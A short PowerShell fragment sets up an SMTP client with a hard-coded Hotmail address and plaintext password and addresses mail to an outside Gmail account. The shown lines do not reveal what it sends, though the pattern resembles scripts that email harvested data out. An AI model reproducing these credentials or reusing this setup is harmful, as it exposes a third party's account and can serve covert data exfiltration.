...
$smtp.Credentials = New-Object System.Net.NetworkCredential("phylisscacatianzx@hotmail.com", "Emailsll521");
$smtp.EnableSsl = $true
$Message.From = "phylisscacatianzx@hotmail.com"
$Message.To.Add("ttu373272@gmail.com")
